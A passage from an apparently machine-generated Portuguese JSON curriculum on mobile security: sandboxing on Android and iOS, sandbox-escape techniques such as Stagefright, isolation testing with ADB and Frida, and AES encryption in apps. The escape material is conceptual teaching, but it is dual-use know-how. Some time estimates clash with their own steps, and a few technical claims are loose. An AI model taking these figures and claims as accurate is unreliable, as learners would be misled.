                                  "subSteps": [
                                    "Defina sandboxing como um mecanismo de isolamento que confina aplicativos a ambientes restritos.",
                                    "Explique que sandboxing limita o acesso a recursos do sistema, como arquivos, rede e hardware.",
                                    "Discuta o propósito principal: prevenir que um app malicioso afete outros apps ou o sistema.",
                                    "Identifique componentes chave: diretórios privados por app e restrições em system calls (syscalls).",
                                    "Compare sandboxing com jailbreaking, destacando riscos de burlar o isolamento."
                                  ],
                                  "verification": "Escreva uma definição de sandboxing em suas próprias palavras e liste 3 benefícios.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação oficial do Android Developers sobre App Sandbox",
                                    "Artigo da Apple sobre App Sandboxing"
                                  ],
                                  "tips": "Use analogias como 'caixas separadas em uma prateleira' para visualizar o isolamento.",
                                  "learningObjective": "Compreender os fundamentos e propósitos do sandboxing em sistemas móveis.",
                                  "commonMistakes": "Confundir sandboxing com firewalls; sandboxing é isolamento por app, não rede."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Sandboxing no Android com SELinux",
                                  "subSteps": [
                                    "Descreva SELinux como Security-Enhanced Linux, usado no Android para controle de acesso obrigatório (MAC).",
                                    "Explique como cada app recebe um UID único e diretório privado em /data/data/<app>.",
                                    "Detalhe restrições de syscalls: apps não podem acessar syscalls fora de políticas SELinux sem permissão.",
                                    "Analise políticas SELinux: contextos como untrusted_app restringem transições de domínio.",
                                    "Examine como o kernel enforce SELinux impede escalada de privilégios."
                                  ],
                                  "verification": "Desenhe um diagrama mostrando o isolamento de um app Android via SELinux.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação SELinux no Android Source",
                                    "Vídeo tutorial sobre SELinux no YouTube (canal Android Developers)"
                                  ],
                                  "tips": "Instale o app 'SELinux Mode Changer' em um emulador para observar modos permissive/enforcing.",
                                  "learningObjective": "Dominar como SELinux implementa sandboxing no Android.",
                                  "commonMistakes": "Achar que SELinux é opcional; é enforcing por padrão em Android 5+."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Sandboxing no iOS com Mandatory Access Control",
                                  "subSteps": [
                                    "Defina MAC no iOS como controle de acesso baseado em políticas do kernel XNU.",
                                    "Descreva o sandbox de apps: cada app em um container com diretório privado em /var/mobile/Containers.",
                                    "Explique restrições de syscalls via profiles de sandbox (sandboxd), limitando chamadas como open() ou socket().",
                                    "Discuta Seatbelt/Sandbox API: políticas definidas em arquivos .sb para restringir acessos.",
                                    "Compare com Android: iOS usa assinatura de código para políticas mais granulares."
                                  ],
                                  "verification": "Liste 5 syscalls restritas no iOS e explique impactos em um app malicioso.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação Apple sobre App Sandbox",
                                    "Código fonte do kernel XNU no GitHub"
                                  ],
                                  "tips": "Use o comando 'sandbox-exec' no macOS para testar políticas semelhantes.",
                                  "learningObjective": "Entender a implementação de MAC e sandboxing no iOS.",
                                  "commonMistakes": "Ignorar que iOS sandbox é mais rígido que Android em acessos de hardware."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar Implementações e Avaliar Benefícios",
                                  "subSteps": [
                                    "Compare Android (SELinux UID-based) vs iOS (MAC profile-based): similaridades em isolamento.",
                                    "Discuta limitações: apps ainda compartilham kernel; exploits kernel podem escapar.",
                                    "Avalie benefícios: mitigação de malware, privacidade de dados, contenção de vazamentos.",
                                    "Explore cenários de bypass: root/jailbreak e como patches OS corrigem.",
                                    "Sintetize: sandboxing é camada fundamental em segurança móvel."
                                  ],
                                  "verification": "Crie uma tabela comparativa Android vs iOS com 4 colunas: mecanismo, restrições, forças, fraquezas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Artigo 'Mobile Sandboxing Deep Dive' no Medium",
                                    "Ferramenta Wireshark para simular tráfego restrito"
                                  ],
                                  "tips": "Pense em apps reais como WhatsApp: dados isolados de outros apps.",
                                  "learningObjective": "Sintetizar diferenças e valor do sandboxing em ecossistemas móveis.",
                                  "commonMistakes": "Superestimar sandboxing como infalível; é defesa em profundidade."
                                }
                              ],
                              "practicalExample": "Imagine um app de lanterna malicioso: sem sandbox, acessaria fotos; com sandbox (Android SELinux/iOS MAC), fica confinado ao seu diretório, falhando em syscalls para ler /DCIM.",
                              "finalVerifications": [
                                "Explique sandboxing em 1 parágrafo sem consultar notas.",
                                "Descreva como SELinux restringe um syscall específico no Android.",
                                "Liste 3 diferenças entre sandbox Android e iOS.",
                                "Identifique um risco de bypass de sandbox e mitigação.",
                                "Desenhe fluxo de um app tentando acessar dados de outro app."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição de sandboxing e componentes (30%)",
                                "Detalhes corretos sobre SELinux e MAC (30%)",
                                "Uso de exemplos concretos e comparações (20%)",
                                "Identificação de limitações e benefícios (10%)",
                                "Clareza e estrutura na explicação (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Conceitos de processos, UIDs e kernel.",
                                "Programação: Análise de syscalls em C/assembly.",
                                "Redes: Isolamento impacta permissões de rede.",
                                "Ética em TI: Privacidade de dados via isolamento."
                              ],
                              "realWorldApplication": "Em bancos móveis como Nubank, sandboxing previne que um app infectado acesse dados bancários, essencial para conformidade com GDPR e PCI-DSS."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.3.2",
                            "name": "Analisar violações de sandbox",
                            "description": "Identificar técnicas de bypass como side-channels ou exploits de kernel, referenciando casos como Stagefright no Android.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Sandboxing em Sistemas Móveis",
                                  "subSteps": [
                                    "Defina sandboxing e seu papel em sistemas como Android (SELinux) e iOS (App Sandbox).",
                                    "Identifique componentes chave: isolamento de processos, permissões de arquivos e rede.",
                                    "Explore limitações inerentes, como compartilhamento de kernel e side-channels.",
                                    "Revise arquitetura de segurança móvel com diagramas.",
                                    "Compare sandboxing móvel com desktop (ex: Chrome sandbox)."
                                  ],
                                  "verification": "Crie um diagrama anotado explicando o fluxo de isolamento e envie para revisão.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação Android SELinux, Apple App Sandbox docs, ferramentas de diagramação como Draw.io",
                                  "tips": "Use analogias como 'caixas separadas em uma casa compartilhada' para visualizar isolamento.",
                                  "learningObjective": "Explicar como sandboxing isola apps e suas vulnerabilidades potenciais.",
                                  "commonMistakes": "Confundir sandboxing com criptografia; ignorar herança de kernel compartilhado."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Técnicas Comuns de Bypass de Sandbox",
                                  "subSteps": [
                                    "Estude side-channels: cache timing, Spectre-like em ARM, Rowhammer em memória móvel.",
                                    "Analise exploits de kernel: privilégio escalada via drivers (ex: binder no Android).",
                                    "Revise confusão de IPC: intents maliciosos ou pipes não isolados.",
                                    "Explore bypass via bibliotecas compartilhadas e injeção de código nativo.",
                                    "Liste 5 técnicas com exemplos de CVEs recentes."
                                  ],
                                  "verification": "Compile uma tabela com 5 técnicas, descrições e CVEs associados.",
                                  "estimatedTime": "3 horas",
                                  "materials": "CVE database (MITRE), papers sobre side-channels (USENIX), Android source code",
                                  "tips": "Busque por 'sandbox escape' no Google Scholar para casos atualizados.",
                                  "learningObjective": "Reconhecer padrões de bypass como side-channels e kernel exploits.",
                                  "commonMistakes": "Focar só em OWASP Mobile Top 10; subestimar side-channels não voláteis."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Caso Real: Stagefright no Android",
                                  "subSteps": [
                                    "Descreva o exploit: parsing MMS malicioso levando a execução remota via libstagefright.",
                                    "Trace o caminho: sandbox do app -> stagefright no mediaserver -> kernel via binder.",
                                    "Identifique falhas: falta de validação, privilégios elevados do mediaserver.",
                                    "Examine patches: ASLR, SELinux policies reforçadas.",
                                    "Simule em emulador com PoC desabilitado."
                                  ],
                                  "verification": "Escreva um relatório de 1 página resumindo chain de exploit e lições.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Blog ZDI Stagefright, PoC GitHub (leia apenas), Android emulator",
                                  "tips": "Use strace ou ltrace para rastrear chamadas em apps semelhantes.",
                                  "learningObjective": "Dissecar um bypass histórico para mapear violações de sandbox.",
                                  "commonMistakes": "Ignorar contexto móvel específico; confundir com web exploits."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Análise em Cenários Simulados",
                                  "subSteps": [
                                    "Configure ambiente: Genymotion ou Android Studio com SELinux permissive.",
                                    "Teste PoCs seguros de bypass (ex: binder overflow simulado).",
                                    "Monitore com logcat, strace e Frida para detectar escapes.",
                                    "Documente evidências: logs de violação de isolamento.",
                                    "Proponha mitigações: hardened malloc, seccomp filters."
                                  ],
                                  "verification": "Grave vídeo ou logs demonstrando detecção de bypass simulado.",
                                  "estimatedTime": "5 horas",
                                  "materials": "Genymotion, Frida toolkit, Android NDK, PoCs de repositórios éticos",
                                  "tips": "Sempre use VM isolada; desabilite rede em testes.",
                                  "learningObjective": "Aplicar análise hands-on para identificar violações em runtime.",
                                  "commonMistakes": "Executar PoCs reais sem isolamento; pular monitoramento de logs."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar Análise e Desenvolver Estratégias de Detecção",
                                  "subSteps": [
                                    "Crie checklist para análise de violações: side-channels, IPC, kernel.",
                                    "Avalie ferramentas: QEMU para fuzzing, syzkaller para kernel.",
                                    "Discuta detecção proativa: anomaly em traces, ML em logs.",
                                    "Revise guidelines de hardening (GrapheneOS).",
                                    "Teste checklist em novo CVE móvel."
                                  ],
                                  "verification": "Desenvolva e valide checklist em 2 cenários hipotéticos.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Syzkaller docs, GrapheneOS whitepapers, checklist templates",
                                  "tips": "Priorize técnicas high-impact como kernel exploits em relatórios.",
                                  "learningObjective": "Formular framework para análise sistemática de violações.",
                                  "commonMistakes": "Sobrecarregar checklist; ignorar falsos positivos."
                                }
                              ],
                              "practicalExample": "Em um app de mensagens Android, um MMS malicioso explora libstagefright no mediaserver, escapando sandbox via binder IPC para executar shell no kernel, permitindo roubo de dados do usuário.",
                              "finalVerifications": [
                                "Pode listar e explicar 5 técnicas de bypass com exemplos de CVEs.",
                                "Analisa corretamente o chain de Stagefright com diagrama.",
                                "Detecta violações em logs simulados com 90% acurácia.",
                                "Propõe 3 mitigações viáveis por técnica.",
                                "Cria checklist funcional testada em cenários.",
                                "Explica side-channels vs. exploits diretos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de técnicas (80%+ cobertura).",
                                "Profundidade na análise de casos reais (detalhes técnicos).",
                                "Qualidade de hands-on: logs e evidências claras.",
                                "Criatividade em mitigações e checklists.",
                                "Clareza em relatórios e diagramas.",
                                "Integração de conceitos interdisciplinares."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entendimento de kernel e IPC.",
                                "Programação Reversa: Análise de binários com Frida/Ghidra.",
                                "Redes: Exploração de side-channels em protocolos móveis.",
                                "Machine Learning: Detecção de anomalias em logs de segurança.",
                                "Ética em Cibersegurança: Responsabilidade em PoCs."
                              ],
                              "realWorldApplication": "Em equipes de pentest móvel, analisa apps para escapes de sandbox em bug bounties (ex: Google VRP), ou em desenvolvimento seguro para auditar mediaservers e permissões."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.3.3",
                            "name": "Configurar e testar isolamento de apps",
                            "description": "Verificar sandboxing com ferramentas como ADB no Android ou Frida no iOS, simulando tentativas de acesso não autorizado entre apps.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de teste para sandboxing",
                                  "subSteps": [
                                    "Instale um emulador Android Studio (AVD) ou dispositivo físico com depuração USB ativada.",
                                    "Instale ferramentas: ADB (Android Debug Bridge) via Android SDK e Frida via pip install frida-tools.",
                                    "Configure um emulador iOS usando Xcode (para macOS) ou simulador com Frida server.",
                                    "Crie dois apps de teste simples: App A (armazena dados sensíveis) e App B (tenta acessar dados do App A).",
                                    "Verifique permissões padrão de apps no manifesto Android e entitlements iOS."
                                  ],
                                  "verification": "Execute 'adb devices' e 'frida-ps -U' para listar dispositivos e processos conectados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Android Studio, Xcode (para iOS), ADB, Frida, apps de teste fonte (GitHub repos como android-sandbox-test).",
                                  "tips": "Use emuladores para evitar riscos em dispositivos reais; ative 'Stay awake' nas opções de desenvolvedor.",
                                  "learningObjective": "Entender e configurar ambientes isolados para testes de segurança móvel.",
                                  "commonMistakes": "Esquecer de ativar depuração USB ou instalar drivers ADB incorretos, causando falha de conexão."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar apps de teste com dados sensíveis e tentativas de acesso",
                                  "subSteps": [
                                    "No App A, implemente armazenamento local (SharedPreferences Android ou Keychain iOS) com dados fictícios sensíveis.",
                                    "No App B, adicione código para tentar ler dados do App A via ContentProvider (Android) ou inter-app communication (iOS).",
                                    "Compile e instale ambos os apps: 'adb install appA.apk' e 'adb install appB.apk'.",
                                    "Execute App A para popular dados, então rode App B para tentativa de acesso.",
                                    "Monitore logs iniciais com 'adb logcat' para observar comportamentos esperados."
                                  ],
                                  "verification": "Confirme instalação via 'adb shell pm list packages' e dados populados abrindo App A.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Android Studio/Xcode, código fonte de apps de teste, APK builders.",
                                  "tips": "Use URIs específicas para ContentProvider no Android para simular vazamentos reais.",
                                  "learningObjective": "Criar cenários realistas de violação de sandbox para testes controlados.",
                                  "commonMistakes": "Definir permissões incorretas no AndroidManifest, permitindo acesso acidental."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Testar isolamento no Android usando ADB",
                                  "subSteps": [
                                    "Inicie monitoramento: 'adb logcat | grep sandbox' para capturar logs de segurança.",
                                    "Simule acesso não autorizado: Execute App B e tente query no ContentProvider do App A.",
                                    "Use 'adb shell am start' para lançar apps e observe falhas de permissão.",
                                    "Analise dumpsys: 'adb shell dumpsys package com.example.appA' para verificar isolamento.",
                                    "Repita com root/emulador rooted se disponível, testando bypasses como SELinux."
                                  ],
                                  "verification": "Verifique logs mostrando 'SecurityException: Permission Denial' para acesso negado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "ADB tool, emulador Android rooted opcional.",
                                  "tips": "Filtre logs por UID/GID dos apps para isolar eventos de sandbox.",
                                  "learningObjective": "Aplicar ADB para validar mecanismos de isolamento Android (app sandbox, SELinux).",
                                  "commonMistakes": "Ignorar logs de sistema, perdendo evidências de bloqueios de segurança."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar isolamento no iOS usando Frida",
                                  "subSteps": [
                                    "Inicie Frida server no dispositivo: 'frida-server &' via SSH ou USB.",
                                    "Anexe Frida ao App B: 'frida -U -f com.example.appB -l script.js'.",
                                    "Crie script Frida para hookar APIs de acesso (ex: NSFileManager, UIPasteboard).",
                                    "Execute script simulando leitura de Keychain ou arquivos do App A, observe exceções.",
                                    "Valide com 'frida-trace -U -f com.example.appB -j \"*!access*\"' para traces automáticos."
                                  ],
                                  "verification": "Script Frida retorna erros como 'sandbox violation' ou 'entitlement denied'.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Frida tools, script.js personalizado, simulador iOS.",
                                  "tips": "Use Frida's Objective-C bridge para hooks precisos em APIs iOS.",
                                  "learningObjective": "Usar instrumentação dinâmica para testar sandbox iOS (App Sandbox, entitlements).",
                                  "commonMistakes": "Frida server não roda como root, falhando em hooks de sistema."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar resultados e documentar vulnerabilidades",
                                  "subSteps": [
                                    "Compile logs de ADB e Frida em relatório unificado.",
                                    "Compare acessos permitidos vs. negados contra documentação oficial (Android SELinux, iOS Sandbox).",
                                    "Teste cenários edge: intents implícitos Android, URL schemes iOS.",
                                    "Gere evidências: screenshots de logs/erros e fluxogramas de falhas.",
                                    "Recomende mitigações: exported=false em providers, strict entitlements."
                                  ],
                                  "verification": "Relatório PDF com pelo menos 5 evidências de isolamento funcionando.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Editor de texto, ferramentas de screenshot (adb screencap).",
                                  "tips": "Use templates de relatório pentest para padronizar saídas.",
                                  "learningObjective": "Interpretar resultados de testes para validar sandboxing eficaz.",
                                  "commonMistakes": "Sobrepor falhas de configuração a falhas de sandbox."
                                }
                              ],
                              "practicalExample": "Desenvolva App A como um 'banco fictício' armazenando PINs em SharedPreferences/Keychain. App B como 'lanterna maliciosa' tenta ler esses PINs via provider/URL scheme. Teste mostra bloqueio, confirmando isolamento.",
                              "finalVerifications": [
                                "Logs ADB mostram SecurityException em todas tentativas de acesso cross-app.",
                                "Frida hooks retornam sandbox violations sem vazamento de dados.",
                                "Dumpsys package confirma UIDs separados e permissões negadas.",
                                "Apps rodam isolados sem crashes inesperados.",
                                "Relatório documenta 100% de bloqueios em 5+ cenários testados.",
                                "Nenhum bypass via intents/URL schemes sem permissões explícitas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de ambiente (conexões ADB/Frida funcionais).",
                                "Qualidade dos apps de teste (simulam acessos realistas sem permissões extras).",
                                "Análise correta de logs (identifica 90%+ de eventos de isolamento).",
                                "Cobertura de testes (Android + iOS, 5+ tentativas variadas).",
                                "Relatório claro com evidências visuais e recomendações.",
                                "Tempo respeitado e zero vazamentos simulados."
                              ],
                              "crossCurricularConnections": [
                                "Programação Móvel: Desenvolvimento de apps Android/iOS.",
                                "Redes e Sistemas: Compreensão de SELinux e entitlements.",
                                "Análise de Malware: Detecção de bypasses de sandbox.",
                                "Ética em TI: Implicações de privacidade em apps móveis."
                              ],
                              "realWorldApplication": "Em pentests móveis para empresas como bancos, validando que apps não vazem dados via isolamento falho, prevenindo ataques como 'tasker exploits' Android ou 'pasteboard leaks' iOS."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.7.3",
                    "name": "Criptografia de Dados Móveis",
                    "description": "Proteção de dados em repouso e em trânsito usando criptografia simétrica e assimétrica em dispositivos móveis.",
                    "individualConcepts": [
                      {
                        "id": "10.1.7.3.1",
                        "name": "Criptografia Simétrica em Dispositivos Móveis",
                        "description": "Uso de algoritmos simétricos como AES para proteger dados móveis com uma única chave compartilhada, garantindo confidencialidade e eficiência em recursos limitados de dispositivos.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.3.1.1",
                            "name": "Identificar algoritmos simétricos comuns",
                            "description": "Reconhecer e descrever cifradores simétricos como AES-128, AES-256 e modos de operação (CBC, GCM) aplicados em cenários móveis, incluindo funções de números pseudoaleatórios para geração de chaves.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos da Criptografia Simétrica",
                                  "subSteps": [
                                    "Defina criptografia simétrica e explique a diferença para assimétrica.",
                                    "Liste os requisitos principais de um algoritmo simétrico: confidencialidade, integridade e eficiência.",
                                    "Identifique o papel das chaves compartilhadas na criptografia simétrica.",
                                    "Revise exemplos históricos como DES e 3DES para contextualizar a evolução.",
                                    "Discuta por que AES substituiu algoritmos anteriores."
                                  ],
                                  "verification": "Resuma em 3 frases os fundamentos e liste 2 vantagens do AES sobre DES.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Artigo NIST sobre AES (FIPS 197), vídeo introdutório no YouTube (Khan Academy ou similar).",
                                  "tips": "Use diagramas de fluxo para visualizar encriptação/desencriptação.",
                                  "learningObjective": "Entender os conceitos básicos de criptografia simétrica e sua relevância.",
                                  "commonMistakes": "Confundir simétrica com assimétrica; ignorar a necessidade de chaves seguras."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Variantes do AES: AES-128 e AES-256",
                                  "subSteps": [
                                    "Estude a estrutura do AES: rounds (10 para 128, 14 para 256) e tamanho do bloco (128 bits).",
                                    "Compare chaves: 128 bits vs 256 bits em termos de segurança e performance.",
                                    "Implemente um exemplo simples de encriptação AES-128 usando uma ferramenta online.",
                                    "Analise trade-offs: AES-256 é mais seguro mas mais lento em dispositivos móveis.",
                                    "Teste diferenças de velocidade em um emulador móvel."
                                  ],
                                  "verification": "Gere uma chave AES-128 e encripte uma mensagem curta; descriptografe para confirmar.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "CyberChef (ferramenta online), documentação OpenSSL, emulador Android Studio.",
                                  "tips": "Comece com AES-128 para simplicidade antes de escalar para 256.",
                                  "learningObjective": "Reconhecer e diferenciar variantes AES por tamanho de chave e aplicação.",
                                  "commonMistakes": "Ignorar impacto no desempenho móvel; usar chaves fracas em testes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominar Modos de Operação: CBC e GCM",
                                  "subSteps": [
                                    "Explique CBC: chaining de blocos com IV e XOR inicial.",
                                    "Descreva GCM: modo autenticado com GMAC para integridade.",
                                    "Compare CBC (confidencialidade apenas) vs GCM (confidencialidade + autenticação).",
                                    "Simule encriptação CBC e GCM em cenários móveis com padding.",
                                    "Identifique quando usar cada um em apps (ex: GCM para TLS em mobile)."
                                  ],
                                  "verification": "Crie diagramas comparativos de CBC e GCM; encripte dados em ambos os modos.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Documentação RFC 5116 (GCM), CyberChef ou Python com pycryptodome.",
                                  "tips": "Visualize com animações online para entender chaining em CBC.",
                                  "learningObjective": "Descrever modos de operação e suas aplicações em contextos móveis.",
                                  "commonMistakes": "Esquecer IV único por sessão; confundir autenticação em CBC."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar em Cenários Móveis com Geração de Chaves PRNG",
                                  "subSteps": [
                                    "Estude PRNGs como ChaCha20 ou sistema crypto de Android/iOS para chaves.",
                                    "Gere chaves usando PRNG em código móvel (ex: Java SecureRandom).",
                                    "Identifique AES em apps reais: inspecione tráfego de apps como Signal ou banking.",
                                    "Discuta cenários móveis: armazenamento local, comunicação segura.",
                                    "Teste identificação via Wireshark em emulador com TLS."
                                  ],
                                  "verification": "Gere chave PRNG, encripte dados móveis e identifique AES no output.",
                                  "estimatedTime": "70 minutos",
                                  "materials": "Wireshark, Android Studio, código Python/Java para PRNG, app de teste como HTTP Toolkit.",
                                  "tips": "Use emuladores para evitar riscos em dispositivos reais.",
                                  "learningObjective": "Integrar identificação de AES com PRNG em contextos móveis reais.",
                                  "commonMistakes": "Usar PRNG não criptográfico; não randomizar IVs."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar Identificação e Descrição Completa",
                                  "subSteps": [
                                    "Analise logs de apps móveis para detectar AES-128/256 + CBC/GCM.",
                                    "Descreva verbalmente ou por escrito um cenário completo.",
                                    "Crie um quiz autoavaliativo com 10 exemplos de algoritmos.",
                                    "Compare com alternativas como ChaCha20 em mobile.",
                                    "Documente um relatório de identificação."
                                  ],
                                  "verification": "Submeta relatório identificando 3 algoritmos em cenários dados.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Logs de tráfego de apps (ex: de tutoriais), template de relatório.",
                                  "tips": "Procure por fingerprints como 'AES' em certificados ou headers.",
                                  "learningObjective": "Identificar e descrever algoritmos simétricos em cenários móveis.",
                                  "commonMistakes": "Não considerar modos de operação; superestimar segurança sem autenticação."
                                }
                              ],
                              "practicalExample": "Em um app de banco móvel, identifique AES-256-GCM ao inspecionar o tráfego TLS: gere chave com SecureRandom (PRNG), encripte PIN localmente e verifique autenticação via tag GCM no Wireshark.",
                              "finalVerifications": [
                                "Liste e descreva AES-128, AES-256 com rounds corretos.",
                                "Explique CBC vs GCM com diagramas.",
                                "Gere e use chave PRNG para encriptar/desencriptar em mobile simulado.",
                                "Identifique 3 usos reais em apps móveis.",
                                "Compare performance em dispositivo low-end.",
                                "Crie um fluxograma completo de um cenário móvel."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de variantes AES (128/256) e modos (CBC/GCM).",
                                "Compreensão de PRNG para chaves seguras em mobile.",
                                "Capacidade de descrever aplicações práticas com exemplos.",
                                "Correção em verificações e avoidance de erros comuns.",
                                "Profundidade em substeps e conexões com cenários reais.",
                                "Clareza em descrições e diagramas produzidos."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Operações em campos finitos (GF(2^8)) no AES.",
                                "Programação: Implementação em Java/Kotlin para Android crypto APIs.",
                                "Redes: Integração com TLS/HTTPS em comunicações móveis.",
                                "Ética: Discussão de privacidade e conformidade (GDPR em dados criptografados)."
                              ],
                              "realWorldApplication": "Em apps como WhatsApp ou bancos móveis (ex: Nubank), AES-256-GCM protege mensagens e transações; desenvolvedores identificam para auditorias de segurança, garantindo conformidade com PCI-DSS e prevenção de vazamentos em dispositivos IoT móveis."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.3.1.2",
                            "name": "Implementar criptografia simétrica básica",
                            "description": "Configurar criptografia simétrica em apps móveis usando bibliotecas como Crypto em Android ou CommonCrypto em iOS para encriptar dados sensíveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Criptografia Simétrica",
                                  "subSteps": [
                                    "Estude algoritmos comuns como AES (Advanced Encryption Standard) e DES, focando em AES-128 ou AES-256.",
                                    "Aprenda sobre chaves simétricas: uma única chave para encriptação e decriptação.",
                                    "Entenda conceitos chave: Initial Vector (IV), padding (ex: PKCS7), modos de operação (ex: CBC, GCM).",
                                    "Diferencie criptografia simétrica de assimétrica e identifique casos de uso em apps móveis.",
                                    "Revise melhores práticas: nunca hardcode chaves, use geradores seguros de chaves."
                                  ],
                                  "verification": "Escreva um resumo de 200 palavras explicando AES e gere um IV aleatório em código simples.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação oficial do NIST sobre AES",
                                    "Tutoriais Khan Academy ou YouTube sobre criptografia básica",
                                    "Artigo 'Symmetric Encryption Explained' no Medium"
                                  ],
                                  "tips": "Use diagramas visuais para entender o fluxo de encriptação/decriptação.",
                                  "learningObjective": "Dominar princípios teóricos para implementação segura.",
                                  "commonMistakes": [
                                    "Confundir chaves simétricas com assimétricas",
                                    "Ignorar a importância do IV único por mensagem",
                                    "Usar chaves fracas ou previsíveis"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e Implementar Criptografia no Android com javax.crypto",
                                  "subSteps": [
                                    "Adicione dependências no build.gradle (não precisa de libs externas, use javax.crypto nativo).",
                                    "Gere uma chave simétrica segura usando KeyGenerator com AES/GCM/NoPadding.",
                                    "Implemente função de encriptação: gere IV, encripte bytes de dados sensíveis (ex: JSON de usuário).",
                                    "Crie função de decriptação: use IV armazenado, decifre e valide integridade.",
                                    "Integre em um app simples: encripte dados antes de salvar em SharedPreferences ou SQLite."
                                  ],
                                  "verification": "Execute o código e confirme que dados encriptados ('hello') viram gibberish e decryptam corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Android Studio",
                                    "Documentação oficial Android javax.crypto",
                                    "Exemplo de código no GitHub: Android AES Encryption"
                                  ],
                                  "tips": "Armazene IV junto com ciphertext, mas nunca a chave em plaintext.",
                                  "learningObjective": "Implementar encriptação funcional em ambiente Android.",
                                  "commonMistakes": [
                                    "Reutilizar IV",
                                    "Não tratar exceções como InvalidKeyException",
                                    "Armazenar chave no código fonte"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar e Implementar Criptografia no iOS com CommonCrypto",
                                  "subSteps": [
                                    "Importe CommonCrypto no projeto Xcode (bridge header ou Swift package).",
                                    "Gere chave simétrica usando SecRandomCopyBytes para 32 bytes (AES-256).",
                                    "Implemente encriptação com CCCrypt (kCCAlgorithmAES128, kCCModeCBC, padding automático).",
                                    "Crie função de decriptação similar, passando IV e chave.",
                                    "Aplique em app iOS: encripte dados sensíveis antes de salvar em Keychain ou UserDefaults."
                                  ],
                                  "verification": "Teste em simulador: encripte string, salve, decifre e compare com original.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Xcode",
                                    "Documentação Apple CommonCrypto",
                                    "Swift AES Encryption tutorial no RayWenderlich"
                                  ],
                                  "tips": "Use kCCModeGCM para autenticação integrada se possível.",
                                  "learningObjective": "Replicar implementação segura em plataforma iOS.",
                                  "commonMistakes": [
                                    "Erro no ponteiro de memória em C APIs",
                                    "Tamanho incorreto de chave/IV",
                                    "Não zerar buffers após uso"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Verificar e Aplicar em Cenário Real",
                                  "subSteps": [
                                    "Teste unitário: crie testes JUnit (Android) ou XCTest (iOS) para encriptar/decifrar múltiplos inputs.",
                                    "Verifique vazamentos: use logs e ferramentas como Android Profiler ou Instruments para checar memória.",
                                    "Teste edge cases: dados vazios, tamanhos grandes, chaves inválidas.",
                                    "Integre em app móvel: proteja login credentials ou dados de saúde.",
                                    "Audite código: remova chaves hardcoded, adicione rotação de chaves."
                                  ],
                                  "verification": "Todos testes passam 100%, sem crashes ou logs de erro de cripto.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "JUnit/XCTest frameworks",
                                    "Postman para simular dados sensíveis",
                                    "OWASP Mobile Security Testing Guide"
                                  ],
                                  "tips": "Use bibliotecas como Tink (Google) para abstrair complexidades em produção.",
                                  "learningObjective": "Garantir robustez e segurança da implementação.",
                                  "commonMistakes": [
                                    "Não testar com dados reais",
                                    "Ignorar performance em dispositivos low-end",
